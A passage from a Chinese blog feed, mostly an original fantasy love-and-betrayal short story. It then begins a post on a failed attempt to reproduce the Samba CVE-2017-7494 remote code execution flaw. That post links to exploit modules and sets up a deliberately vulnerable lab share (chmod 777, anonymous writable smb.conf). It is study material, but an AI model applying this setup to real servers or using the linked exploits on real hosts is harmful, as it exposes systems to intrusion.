<p>洛瑶慌张地走到秦铭身旁，俯下身子查看他的伤势，随即拿出了丹药为他疗伤。半柱香后，秦铭躺在洛瑶的怀中，缓缓地睁开双眼，周围仍是无尽的黑暗，但眼前的女子却是光彩亮丽。秦铭看着眼前似曾相识的女子，乏力地说道：“我这是在哪？”洛瑶搀扶着秦铭，“这是黑风阵，我们必须赶紧离开”。</p>
<p>话音刚落，洛瑶挥动着手指，一条条紫色丝带将秦铭紧紧包裹住，随即化身为两道亮光直冲黑暗的尽头。当光明冲破黑暗，秦铭身上的丝带飘逸地飞回洛瑶身边。秦铭静静地望着不远处的那片黑暗，阵阵黑风旋转着组成的暗黑地带渐渐消失不见，出现在眼前的仍是那片树林，还有头顶的星空。</p>
<p>“秦铭，你没事吧？”洛瑶走近秦铭。“恩…我没事”秦铭转过头望着洛瑶，眼神恍惚不定，“你…是女神？”。“秦铭，你不记得我了吗？我…我是洛瑶啊！”洛瑶激动地扑向秦铭。“洛…瑶，洛瑶”，秦铭感觉一阵心如刀绞的痛，跪倒在地，痛苦地回想着熟悉而又陌生的那个人，那些光景。</p>
<p>迷茫的光晕渐渐散开，朱门外，少男摇曳着手中的纸扇。清风徐徐，蓝天下轻盈的风筝飞出深墙，落在了少男身旁。朱门内，少男走近身着高贵的少女，“小姐，小生秦铭，特来归还风筝”，少女微红着脸，轻声应道：“我…我叫洛瑶”。蓝天中随风舞动的风筝悠闲的翱翔，青草地上人们追逐着。秦铭拉着长线一直蔓延到天边，洛瑶犹如彩蝶般地追随。“秦铭，等等我，等等我！”洛瑶追赶着他，秦铭转过头“你来追我啊，我可要一直跑着，让你追我到天涯海角。”洛瑶停了下来，喘了口气，“好啊，你等着！”说罢便追身赶去。</p>
<p>“秦铭，你没事吧？”洛瑶摇晃着倒地的秦铭。秦铭看着眼前的女子，“我记得，洛瑶。”洛瑶眼中含着泪，与秦铭相拥而抱，“秦铭，太好了，你还记得我”。</p>
<p>不知不觉中风轻云淡，天色渐渐转亮，想必又度过了一个黑夜，黎明总归到来了。</p>
<p>神魂殿内，紫衣少女跪身说道：“主人，秦铭逃出了黑风阵，现在正赶往紫铭山顶。”青灯紧握着双拳，“一群废物，连一个凡人都困不住！”紫衣少女连忙上前“主人，原本秦铭已经身陷黑风阵，谁知洛瑶现身救了他”。青灯颤抖着身子，轻声念叨“洛瑶，看来血书还是骗不了你，那就别怪我无情了”，眼中充满了伤感，“紫风，你先回老东西身边，看来是时候出马了。”</p>
<p>一道道光束消失在殿内，留下的只有百年间的恩怨纠缠。</p>
<h4 id="紫铭山顶"><a href="#紫铭山顶" class="headerlink" title="紫铭山顶"></a>紫铭山顶</h4><font color="#0593d3"><em>骤然雪已灭，北岛的风没有落定终点</em></font>

<p>紫铭山顶尘埃落定，百姓听从圣母的号召，陆陆续续地赶往山顶，准备参拜战神。此时，天空中突然闪过一道青光，青灯降临山顶，幻化成百姓，混入人群。清风拂过山顶，吹动着凋零的叶，摇曳于蓝天下，缓缓飘向远方。</p>
<p>已在山脚的秦铭望着不远处飘来的落叶，片片落进他的心中，凋零着他与秦三的回忆。洛瑶看出了他的心事，握住他的手说：“你爹很爱你”。秦铭眼中含着泪，“是我害了他”，洛瑶上前紧紧抱住他说,“不，不是的。你爹的死与你无关，我们还是赶紧上山找到你爹的尸骨，到时你会明白的。”再次踏上上山之路，秦铭没有了当初的好奇，只是多了一份沉重。</p>
<p>穿过飘零的落叶，两道紫光降临山顶。紫风搀扶着圣母，俯瞰着拥挤的人群。</p>
<p>看见圣母降临，众人无不下跪参拜，唯独一位风度翩翩的少男摇着纸扇，嘴角散发出诡异的笑容。紫风纵身一跃，化成光束飞向他，瞬间一把利刃逼近他的胸前。紫风望着眼前的少男，露出了一丝微笑，眼看手中的利刃已近乎他的胸膛。“紫风！”随着一声叫喊，圣母已站立在少男的跟前，紫风见状迅速收起利刃。紫风走近少男：“大胆刁民，见了圣母，为何不跪拜！”，圣母面露笑容，“紫风，你看他是谁！”。紫风定睛望着眼前的少男，“你……你是秦铭？”，圣母摆了摆手说道：“不，他不是秦铭”。少男见状赶忙跪拜，“草民青灯，方才初见圣母威仪，乱了心神，忘了礼法，请求圣母发落”。紫风望着圣母说道：“圣母，难道他就是战神再生？”，圣母走近青灯，只见一道光起，飞入青灯的眼眸。</p>
<p>顿时风停云定，紫风静静地守候着被定格的青灯。此时，秦铭与洛瑶已赶到山顶，穿过拥挤的人群，两人来到紫风面前。紫风参见过洛瑶说道：“女神，秦铭乃是元婴之体，你怎么会跟他在一起？”。洛瑶走过紫风，望着定格的青灯，挥舞着手指，在她身后一根根柔软的丝带如同一把把锋利的长剑，直直逼向青灯。就在此时，从青灯的眼眸中飞出一道亮光，瞬间斩断了飞舞的丝带。圣母阴沉着脸，死死地盯着洛瑶：“怎么？上回没能杀死假战神，这次来杀真的战神了？”洛瑶冷笑道：“恐怕圣母是老眼昏花了吧，秦铭才是真正的战神再生。”随后转向紫风冷冷地说道：“紫风，秦三死前把血书交付于你，你可知他的尸骨现在何处啊？”。紫风低着头说道：“想必现在已存在于山间野兽的腹中了吧”。秦铭听完后，跪倒在地。</p>
<p>青灯回过神来，向紫风使了个眼色。紫风见机赶忙对着洛瑶说道：“女神，在你身边的是转世元婴，不信你可以问他自己。秦三自杀后，留下的那封血书便是最好的证明，什么战神，要我说就是害死自己父亲的害人精”。秦铭摸了摸胸中的血书，抽搐着低声说道“没错，我并不是什么战神转世，我……我只是一个杀害自己父亲的凶手”。说罢，秦铭擦拭着眼泪，转身跑开，洛瑶紧追其后。</p>
<p>风起云涌，圣母望着躁动的百姓，说道：“百年之前，战神将军为了北岛的安危，选择了牺牲自己。百年之后，战神将军再次重现人间，将重新担负起保卫北岛的重任，而他就是战神再生，青灯！”。话音一落，众生欢呼，纷纷下跪参拜战神。风轻云淡间，三人消失于紫铭山顶，光芒划破天际，飞向紫金神殿。</p>
<p>紫金神殿内，圣母笑着对青灯说道：“三日之后将会举行即位大典，你暂且居住在此好生休养，紫风会负责照顾你的起居。”青灯嘴角露出笑容，不紧不慢地说道：“多谢圣母!”。说罢，青灯回到自己房间，脱下人的外衣，冷笑道：“三日之后，北岛城就将落在我的手中，到时你们都得死，哈哈……”。就在此时，房门敲响，“谁！”青灯幻化人样，贴近房门。“战神将军，是我，紫风”，青灯匆匆打开房门，环顾四周，笑着对紫风说道，“紫风姑娘请进！”。</p>
<p>房内，青灯双手放在身后，站立在窗前。紫风跪拜在青灯身后笑着说道：“主人，如今圣母已对你没有丝毫戒心，即位战神看来已是定局。”青灯缓缓转过身子，搀扶起紫风，“紫风啊，多亏了你，我才能走到这一步，我不会亏待你的。不过为了万无一失，我还需要你为我做一件事。”紫风坚定地说道：“主人，我只求永远跟随主人左右，即使牺牲自己也在所不辞。”青灯抚摸着紫风的后背说道：“好！”随即从怀中拿出一个盒子，“这个盒子里面装的，是致命的毒药，我要你每日三次将其混入茶水之中，奉于圣母服用。三日之后，她必定死无葬身之地，到时北岛圣母非你莫属”听罢，紫风抖动了一下身躯，感到背后一阵寒意。她脸色苍白，匆忙将盒子塞入怀中起身离开。</p>
<p>走出房间，紫风踉跄地扶着墙壁走向圣母寝宫。她变得失魂落魄，为了青灯，她可以做任何事，甚至牺牲自己。为此，她欺骗了圣母，她违背自己的良知设计秦铭，为的并不是取代圣母，而只是想让青灯为她露出一丝微笑，哪怕只是一秒。慢步蹒跚至圣母寝宫，紫风望着她赖以成长的地方，回想起了当年自己被父母遗弃，如若不是圣母慈悲收留，恐怕早已横尸山野。圣母待她如同至亲，回望那些年的光景，紫风露出了微笑。</p>
<p>黑云压至，一阵寒风袭来，打破了紫风幸福的回望，等待他的是艰难的抉择。紫风面如死灰，快步走向圣母厢房，配置好毒药，准备伸手敲开房门。正在此时，一段段儿时幸福的回忆跳动在她脑海，她颤抖着缩回那双敲进地域之门的手。正当紫风准备转身离去时，房内传出圣母的呼唤，“紫风，是你吗？进来吧。”</p>
<p>紫风端着致命的毒药，推开了房门，膝跪在圣母面前说道：“圣母，这是紫风特意为您冲煮的长寿茶。”圣母起身接过热茶，流露出慈祥的笑容，“紫风啊，你有这份孝心，也不枉我把你抚养长大。”</p>
<p>紫风缓缓抬起头，望着圣母喝下自己亲手配置的毒药，嘴角是一丝冷冷的笑。此时，在紫风心中，儿时的幸福回忆早已被当年那个翩翩少男所取代。为此，她甘心为他做事，成为他监视圣母的棋子，为的只是博取他一个赞赏的目光或是一丝满意的微笑。</p>
<p>电闪雷鸣间，磅礴大雨敲击着紫金大地，洗礼下一片片尘埃，还有那些交错爱恨情仇。</p>
<h4 id="即位大典"><a href="#即位大典" class="headerlink" title="即位大典"></a>即位大典</h4><font color="#0593d3"><em>骤然梦搁浅，情恨水的魔力依旧不变</em></font>

<p>三日之后，即位大典如期举行。议事大殿内，北岛国的代表们纷纷落位，等待着圣母的驾临。大殿之外，几十位紫衣仙子飞舞于蓝天下，环绕着大殿挥舞彩带。</p>
<p>“圣母驾到”。</p>
<p>紫风搀扶着圣母缓慢地走入议事大殿，众长老纷纷起身跪拜。圣母每走几步，便弯腰轻咳，一旁的紫风轻拂着圣母弯曲的后背。</p>
<p>“圣母为国操劳，一定要注意圣体啊”</p>
<p>“圣母千秋万载，永生不灭”</p>
<p>……</p>
<p>顿时，议事大殿内议论四起。</p>
<p>圣母吃力地抬起右手，停顿几秒后，殿内又恢复了平静。“多谢各位的关心，我老婆子没这么容易倒下。”话音刚落，紫风凑近圣母耳朵说道，“圣母，吉时已到”。</p>
<p>“传青灯”。青灯恭恭敬敬地挪步殿内，站立于殿中。</p>
<p>“各位，我在此代表北岛各族，正式宣布，由青灯担任我们北岛国新一任的……”。</p>
<p>“等一等！”。殿内响起一声叫喊，洛瑶冲出人群，揭开面纱说道：“各位长老，殿上之人并非战神再生”，顿时殿内非议四起。</p>
<p>圣母瞬移至洛瑶面前，死死地看了她一眼后转身对众长老说道：“各位难道还不相信我的眼光吗！”，待到殿内恢复平静，对着洛瑶说道,“洛瑶啊洛瑶，你若再执迷不悟，就休怪我不顾情面了”。洛瑶走进人群，拉出蒙面男子，揭开其面纱，对着众长老说道：“他才是真正的战神再生”。</p>
<p>青灯望着秦铭嘿嘿笑着，“哪里来的妖孽，竟然敢冒充战神！”。看着与自己长得一模一样的青灯，秦铭心中寒意顿生，哆嗦着，“你…你才是…妖…妖孽”，两人四目相对，而众长老们更是疑云顿生。大殿之内，长老们指指点点着，议论声此起彼伏，场面混乱不堪。洛瑶趁机使出瞬移之术，双手挥动着变化出一把光芒四射的利剑，直直逼向青灯。</p>
<p>青灯眼看着洛瑶的利剑将要穿入自己的胸膛，但他却不能施法反抗，不然好不容易博取的信任，便会付之东流。在此千钧一发之时，一道紫光穿过洛瑶的胸膛，定格了她的身影。随即，鲜血从洛瑶胸口涌向嘴角，从嘴角喷向大殿。洛瑶摇晃着身体，憋住最后一口气，转身看着秦铭，耗尽全力从嘴角挤出两个字。秦铭眼看着洛瑶倒地前嘴角的那声：“快走！”，眼泪已淹没了眼眶，他没有听从洛瑶，而是跪地搂起她的身子，紧紧地抱着，即使被圣母扔下悬崖，他也不放开。</p>
<p>望着被抛入悬崖的洛瑶与秦铭，圣母狠狠地对众长老说道：“这就是不服从我的下场！现在我宣布，由青灯担任北岛国的战神，众位可有异议！”。长老们纷纷跪地磕头参拜。</p>
<p>“圣母英明，千秋万载，永生不灭！”。</p>
<p>“战神英武，一统四国，无人可挡！”。</p>
<p>青灯与紫风四目相望，殿内传出一声声长笑，伴随着阵阵礼炮齐鸣，响彻山谷。</p>
<p>圣母转身回宫，没走几步，一口鲜血喷涌而出，紫风连忙上前搀扶着。直至圣母寝宫，紫风端起最后一碗毒茶，走进圣母厢房。近至床前，看着卧病不起的圣母，紫风起了杀心，她端起毒茶，灌进了圣母嘴中。看着闭上双眼的圣母，她流着泪笑着，“最后一个障碍也替你除了，青灯，你终于可以安心主宰北岛，而我也能光明正大的陪伴在你左右”。</p>
<p>紫风想象着与青灯一起的幸福，百年前的初次相见，便沦陷于他的眼眸。百年间，为了能与青灯永生相伴，她不顾一切。现在，她终于完成了青灯的梦想，也是时候享受属于自己的那份幸福。她微笑着，突然胸口一阵剧痛，一把利刃从背后刺穿她的胸膛，鲜血直流。她用手拔出胸前的利刃，转身倚靠在床头，死死地望着眼前的蒙面男子。她瞥眼望着掉落在地的利刃，眼中含着泪，嘴角不停的重复着同一句话：“为什么是你？”，她睁大着眼，直至咽下最后一口气，也没有闭上，她想看清的不是面纱背后的脸，而且胸膛内的心。</p>
<p>望着死去的紫风，男子揭下了面纱，冷笑道：“紫风，你才是我最后一个障碍”。随后，化为一阵青风永远的消失在紫风的美梦之中，留下的只有悲凉。</p>
<p>圣母走到紫风尸骨跟前，用手轻拂紫风的眼睛，望着地上的泛着寒光的利刃，哀叹道：“万物皆有道，唯情无道。百年前，你赠与他的紫金宝剑，如今却成了夺你性命的凶器。而你一生爱着的人，却毁掉了你所有的幸福美梦”。说话间，圣母挥动着手指，随即幻化出无数的彩蝶，拖动着紫风的尸骨飞向远方。</p>
<p>望着远去的紫风，圣母凝重着脸，大战即将而至。</p>
<p>紫金神殿内，灯红酒绿，醉意已深的青灯摇晃着追逐着宫女，飘浮着的轻纱蒙住了他的眼睛。他一把抓住衣着裸露的宫女，紧紧地抱住，嘴里嘟囔着，“洛瑶，我是那么地爱你，可你的心里为何只有战神，我哪里比不上他，为了得到你的芳心，我幻化成他的模样，可最终你还是把我给忘了”。宫女们纷纷拿起酒杯，往青灯嘴里边灌边说，“将军，如今你已是一人之下，万人之上，何愁找不到一个心仪的女子”。此时，殿外走进一个身影，青灯摇晃着起身，眯着眼睛看着。他迷迷糊糊地听到：“青灯，本圣母驾到，为何还不跪见！”。待到青灯回过神来，他赶忙用内力逼出了体内的酒，看着眼前本应被紫风毒害死的圣母，乱了方寸。</p>
<p>“你……你不是已经死了吗？”青灯吃惊道。</p>
<p>“我只知道将要死的人是你！”。说话间，圣母双手挥舞着，半空中变化出无数的利剑，直直地飞着青灯。青灯见状立即双拳紧握，气运丹田，在身体周围制造出了强大的气墙。只见，一把把利剑没等触碰到青灯，便应声落地，被气墙挡在外面。正在这时，青灯身后的宫女开始运气，想趁其不备攻击他的后方。而狡猾的青灯，早已察觉到了背后的浓浓杀气。没等宫女动手，便先发制人，转身把宫女击倒于掌下。此时，宫女的易容之术随着青灯的掌力而消失，出现在他面前的是一张熟悉的脸。“洛瑶，原来你没死”，青灯望着身受重伤的洛瑶大声叫到，“你们一个个装死骗我，好，那我就亲手送你们上西天”。青灯运气于掌心，准备击向洛瑶，正在此时，秦铭冲进神殿，挡在洛瑶身前。青灯见状，冷笑道，“你一个小小的凡人，还想保护她，当年你没能保护你心爱的女人，没能保住整个北岛，现在也一样”。说完便起掌相击，没等掌锋伤及秦铭，青灯的一口鲜血便喷涌而出。“青灯，你已中了蚀心虫毒，方才你一运气，便已毒气攻心。”洛瑶冷笑道。青灯望着酒杯哀道：“酒中有毒！你……你们设下圈套，就是为了引我上钩，待我放松警惕后置我于死地。呵呵……想不到我到头来还是自作自受。可我不甘心，你们是怎么看破我的计划？难道是紫风，她出卖了我！”。</p>
<p>“不！紫风从头到尾都没有出卖过你，她一心一意为你，她也确实在茶中下了毒，但我早已察觉她是你的人，所以她奉茶是真，而我喝茶是假。”圣母说道。</p>
<p>“当初在紫铭山顶，我察觉到了你的存在，也察觉到了秦铭。我便与圣母合作，让你误以为秦铭中了摄魂术。起初我们并不知道你的计划，直到你利用紫风让我们看到了血书，我们才知道你是想利用血书，让我们以为秦铭并非战神，并让秦铭在害死自己父亲的阴影中含泪而终。在与圣母商议后，我们决定将计就计，制造我与圣母的矛盾，在你骗取圣母的信任后，我就假死在圣母手上。我们知道，只有我们两个都死了，你才会放松警惕，我们才有机会下手。”洛瑶倚靠在墙角笑着说道。</p>
<p>“原来你们一早就识破了我的计划，可是……可是紫风是你一手带大的，难道你一直都不信任她？”，青灯跪倒在地，强忍着蚀心的苦痛。</p>
<p>圣母定了定神，望着窗外，“不，紫风是我一手带大的，我待她如同至亲，我对她从没有戒心，也很了解她。不过，也正是因为太了解她，所以她所说的每一句我都清楚是真是假。我一直没揭穿她，一方面是想借着她看清你的计划，另一方面也是希望她能早日回头。然而，她头也不回地走向她认为的天堂，没想到的是，天堂之门背后的却是无间的炼狱”。</p>
<p>青灯干涩的眼眸开始湿润，他感到无比的心痛，蚀心虫一点点地咀嚼着他的心。他不知道，在他的心中，不止住着洛瑶，更住着紫风。他从没有像现在这样痛苦，因为他开始知道心痛。那种痛并不是万虫蚀心之痛，而是失去至爱之痛。</p>
<p>挣扎在死亡的边缘，青灯用尽最后一丝真气，幻化成一道青光，消失在远方。</p>
<p>城外，望着空中成群飞舞的彩蝶，青灯追逐而上。顿时，彩蝶散开，青灯望着彩蝶之中的紫风，露出了微笑，紧紧地将她拥在怀中。瞬时，飞舞的彩蝶伴随着两道彩光消失于蓝天下。</p>
<p>殿内，秦铭紧按着自己的胸口，他感到胸内有一股气流即将澎涌而出，疼痛难忍。望着因疼痛而倒地的秦铭，洛瑶立即上前为他活血运气。然而，秦铭的疼痛并没有减轻，反而越演越烈。洛瑶紧抱着已奄奄一息的秦铭，哭喊着，“秦铭，不，你不可以离开我。百年前，我们没能在一起，百年后，你为何又要离我而去”。</p>
<p>圣母走近洛瑶跟前，无奈地说道：“洛瑶，他……他不是战神”。洛瑶眼含着泪，望着圣母吃惊地说道：“你说什么？他怎么可能不是战神，我不会认错的，他就是战神”。圣母叹了口气，说道：“他是青灯，而青灯也是他，他们原本就是一个人。话说，百年之前，掌管天庭九灯的灯神，因私自下凡，留恋红尘，震怒了上天，因此被贬为凡人。可是，没想到的是，灯神因为不满上天的惩戒，逃离了肉身，万年修道，一念成魔，而他的肉身便落入凡间轮回转世，也就是你眼前的秦铭。天帝知道后，为了惩戒他，将他与肉体双双化为元婴，并且彼此不知道对方的身世，直至自相残杀而死。如今，青灯已死，他也就不免化为尘土，消失于世上”。洛瑶抖动着身子，哭喊着：“不，不可能的，那我的战神呢？他去了哪？”。圣母说道：“战神只是凡人，遭遇百年浩劫后便消失于六道轮回，不会再出现了”。</p>
<p>洛瑶抱着怀中的秦铭，撕心裂肺地哭喊。她脑海中那条尘封的记忆线，散发着微光，也许就要苏醒。圣母走向殿外，抬头仰望着蓝天，她深深地吸了一口气，随后缓缓吐出。一切即将尘埃落定，时间可以忘记仇恨，却忘不了你所爱的人。</p>
<h4 id="百年爱恨"><a href="#百年爱恨" class="headerlink" title="百年爱恨"></a>百年爱恨</h4><font color="#0593d3"><em>叶落下了思念，风摇曳那些岁岁年年</em></font>

<p>紫风望着圣母说道：“圣母，难道他就是战神再生？”，圣母走近青灯，只见一道光起，飞入青灯的眼眸，穿过青灯的记忆，圣母看到了那些年的光景。</p>
<p>万年修道成仙的青灯，私自下凡，幻化成人间的灯火，观望着人间的一切。</p>
<p>元宵佳节，穿越渭河上的古桥，青灯幻化成了少男手中的灯火。桥上，洛瑶看着河水中的星点亮光，在绚烂的夜空下翩翩起舞。初降人间的青灯，望着她翩翩的舞姿，微红的脸颊，每一颦一簇都深深地烙在他的心上。古桥上，望着远去的洛瑶，少男仍然站在原地，闻了闻手中残留的香味，露出了微笑。而在此时，少男手中的灯火窜动，看着眼前的少男，青灯飞离了灯火，幻化成少男的模样。</p>
<p>转眼朱门内，幻化为少男的青灯，摇曳着手中的纸扇。清风徐徐下，青灯化名秦铭，与洛瑶追逐于蓝天下。蓝天中随风舞动的风筝悠闲的翱翔，青草地上洛瑶追逐着秦铭，蔓延爱的痕迹。</p>
<p>目光转向紫金神殿内，圣母指着身旁的少男，对洛瑶说道：“洛瑶啊，他即将成为我们北岛国的战神，为了能更好的治理北岛，为了我们北岛的未来，我决定将你许配于他，你说好吗？”。望着眼前的少男，洛瑶知道是他，元宵佳节上的初见，朱门内的相识，草原上的奔跑，都是他，秦铭。洛瑶点了点头，红着脸跑向殿外。</p>
<p>然而，交错百年的爱恨情仇，正从此刻开始蔓延。夜空中无数的烟花绽放，老树下少男紧紧地搂着洛瑶，绚丽的烟花瞬间落幕，幻化成永世的缠绵。渭河倒映着爱的痕迹，一阵涟漪，渐渐散开。此时的青灯幻化成人间烟火，看着眼前的少男，看着少男怀中的洛瑶，他满目悲伤。正当洛瑶与战神的大婚宴上，青灯幻化成人形，强行冲进殿内，只是希望能告诉洛瑶真相。然而，面对着强大的紫衣族人，面对北岛的圣母，青灯铩羽而归。一气之下，青灯联合其余三国，攻打北岛，为的只是证明自己的能力强于战神，而自己才是洛瑶真正爱的人。突如其来的战争使得北岛生灵涂炭，血流成河，民生的哀悼响彻天地间。天帝得知后，大发雷霆，派遣天兵天将捉拿青灯，而此时的洛瑶得知青灯才是秦铭后，痛苦不已。</p>
<p>紫金神殿内，圣母尘封了洛瑶与青灯之间的记忆，留下的只有她与战神的片段，只有如此，才能维护北岛的声誉，才能减轻洛瑶的痛苦。为了使北岛的百姓随着时间的流逝渐渐遗忘这段孽缘，圣母不惜编造出百年浩劫，而情恨水也只是用来尘封洛瑶对青灯的那段记忆。</p>
<p>青灯被贬下凡间，永受轮回之苦，而洛瑶封闭了对青灯的记忆之门。一切看似尘埃落定，百年爱恨也随流消逝，不变的只有泛着银光永无止尽的雪，掩盖着百年的记忆。</p>
<p>……</p>
<p>百年之后的雪夜，圣母双手抱着婴儿，来到秦三家门口，停顿片刻后将孩子放在了门外。几日之后，圣母化身为紫衣仙人，留下了一段话：元婴现世，几世情缘；百年浩劫，父为子亡。</p>
<h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>如果你能坚持看完，那么你一定是个技术大牛。<br>本篇小说是我写得最长的一篇短篇小说，构思花了很大的心思，虽然剧情比较老套，但是剧情我依然比较满意。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;左手华灯初上，右手星点余光&lt;/blockquote&gt;&lt;br&gt;　　废话不多说，扒几篇躺在QQ空间的原创小说，应该是3、4年前写的东西。回想当年还是一个意气风发的少年，遥想当年羽扇纶巾，谈笑间…..扯远了。回归正题，开博至今都是在分享一些技术内容，是时候调调味了，因此我在博客中新增了一个分类：&lt;a href=&quot;http://thief.one/categories/%E8%AF%97%E6%84%8F%E5%B9%B4%E5%8D%8E/&quot;&gt;&lt;font color=&quot;#0593d3&quot;&gt;诗意年华&lt;/font&gt;&lt;/a&gt;，专门用来分享一些本人原创的小说或者诗歌，也算是对以往生活的一个祭奠。&lt;br&gt;
    
    </summary>
    
      <category term="诗意年华" scheme="http://thief.one/categories/%E8%AF%97%E6%84%8F%E5%B9%B4%E5%8D%8E/"/>
    
    
      <category term="原创小说" scheme="http://thief.one/tags/%E5%8E%9F%E5%88%9B%E5%B0%8F%E8%AF%B4/"/>
    
  </entry>
  
  <entry>
    <title>Samba远程代码执行漏洞(CVE-2017-7494)</title>
    <link href="http://thief.one/2017/05/25/2/"/>
    <id>http://thief.one/2017/05/25/2/</id>
    <published>2017-05-25T07:28:42.000Z</published>
    <updated>2017-07-25T12:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">我自横刀向天笑 去留肝胆两昆仑</blockquote><br>　　原本想复现一下CVE-2017-7494漏洞再分享出来的，没曾想过程一波三折，结果还铩羽而归。诶，还是在此记录一下失败的复现过程吧，为了纪念一下折腾不止的岁月，还有原谅我没有最终复现成功-！-。<br><a id="more"></a><br>　　关于此漏洞的介绍不用多说，可以移步<a href="http://www.freebuf.com/vuls/135624.html" target="_blank" rel="external"><font color="#0593d3">Samba远程代码执行漏洞|Freebuf</font></a>。Samba远程代码执行漏洞被业内称为linux版的永恒之蓝，危害可想而知。当然相比windows来说，linux下的445端口是默认关闭的，而有些版本的linux并没有自带samba软件，算是万幸。</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Samba 3.5.0到4.6.4/4.5.10/4.4.14的中间版本。</p>
<h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><ul>
<li>服务器打开了文件/打印机共享端口445</li>
<li>共享文件拥有访问以及写入权限</li>
<li>攻击者知道共享的目录路径</li>
</ul>
<p>　　目前测试发现匿名登录与需要账号密码登录的情况都可以成功执行此漏洞，当然设置了账号密码的，在攻击时需要提供正确的账号密码。</p>
<h3 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h3><p>攻击者可通过上传恶意的链接库文件（.so），使服务端程序加载并执行它，从而实现远程代码执行。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>MSF已经更新了此漏洞的利用模块，链接：<a href="https://github.com/hdm/metasploit-framework/blob/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb" target="_blank" rel="external">is_known_pipename.rb</a><br>另外国外大牛也用python写了个利用脚本（exp）：<a href="https://www.exploit-db.com/exploits/42060/" target="_blank" rel="external">42060.py</a></p>
<h3 id="复现的坑"><a href="#复现的坑" class="headerlink" title="复现的坑"></a>复现的坑</h3><p>　　想要复现此漏洞，首先得搭建一个靶机（不建议找公网的机子测试）。于是我找了台ubuntu服务器（14.04.1-Ubuntu），此版本默认安装了samba（Version 4.3.11-Ubuntu）省去了一些安装的麻烦，那么接下来就是要配置samba。<br>首先创建一个目录用于共享<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkdir /home/share</div></pre></td></tr></table></figure></p>
<p>然后设置权限（若不设置权限，用户将会没有写权限）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 777 /home/share</div></pre></td></tr></table></figure></p>
<p>最后修改samba配置文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/samba/smb.conf</div></pre></td></tr></table></figure></p>
<p>在文件最后添加一下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[myshare]</div><div class="line">comment=smb share <span class="built_in">test</span></div><div class="line">browseable=yes <span class="comment">#可读</span></div><div class="line">writeable=yes <span class="comment">#可写</span></div><div class="line">path=/home/share  <span class="comment">#设置目录（上一步创建的共享目录）</span></div><div class="line">public = yes <span class="comment">#允许匿名登录</span></div></pre></td></tr></table></figure></p>
<p>开启samba服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/smbd start  <span class="comment">#开启</span></div><div class="line">/etc/init.d/smbd stop   <span class="comment">#关闭</span></div><div class="line">/etc/init.d/smbd restart <span class="comment">#重启</span></div></pre></td></tr></table></figure></p>
<p>开启后，尝试远程访问一下：\\ip，经过测试我发现可以匿名登录，登录以后也有写权限。</p>
<p>靶机搭建完毕，接下来就开启MSF神器吧。</p>
<h4 id="MAC10-11版本不支持最新版MSF"><a href="#MAC10-11版本不支持最新版MSF" class="headerlink" title="MAC10.11版本不支持最新版MSF"></a>MAC10.11版本不支持最新版MSF</h4><p>　　首先我在MAC上更新了msf，直接敲命令：<em>msfupdate</em>，没过多久更新成功了，于是我准备启动msf，输入命令：<em>msfconsole</em>，结果报错了（一脸懵逼，早知道就加载exploit文件就行了）。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">dyld: lazy symbol binding failed: Symbol not found: _clock_gettime</div><div class="line">  Referenced from: /opt/metasploit-framework/embedded/lib/libruby.2.4.1.dylib (<span class="built_in">which</span> was built <span class="keyword">for</span> Mac OS X 10.12)</div><div class="line">  Expected <span class="keyword">in</span>: /usr/lib/libSystem.B.dylib</div><div class="line"></div><div class="line">dyld: Symbol not found: _clock_gettime</div><div class="line">  Referenced from: /opt/metasploit-framework/embedded/lib/libruby.2.4.1.dylib (<span class="built_in">which</span> was built <span class="keyword">for</span> Mac OS X 10.12)</div><div class="line">  Expected <span class="keyword">in</span>: /usr/lib/libSystem.B.dylib</div><div class="line"></div><div class="line">/opt/metasploit-framework/bin/msfdb: line 23:  4721 Trace/BPT <span class="built_in">trap</span>: 5       ruby <span class="string">"<span class="variable">$INSTALL_DIR</span>/embedded/framework/msfdb"</span> <span class="string">"<span class="variable">$@</span>"</span></div><div class="line">dyld: lazy symbol binding failed: Symbol not found: _clock_gettime</div><div class="line">  Referenced from: /opt/metasploit-framework/embedded/lib/libruby.2.4.1.dylib (<span class="built_in">which</span> was built <span class="keyword">for</span> Mac OS X 10.12)</div><div class="line">  Expected <span class="keyword">in</span>: /usr/lib/libSystem.B.dylib</div><div class="line"></div><div class="line">dyld: Symbol not found: _clock_gettime</div><div class="line">  Referenced from: /opt/metasploit-framework/embedded/lib/libruby.2.4.1.dylib (<span class="built_in">which</span> was built <span class="keyword">for</span> Mac OS X 10.12)</div><div class="line">  Expected <span class="keyword">in</span>: /usr/lib/libSystem.B.dylib</div><div class="line"></div><div class="line">/opt/metasploit-framework/bin/msfconsole: line 123:  4725 Trace/BPT <span class="built_in">trap</span>: 5       <span 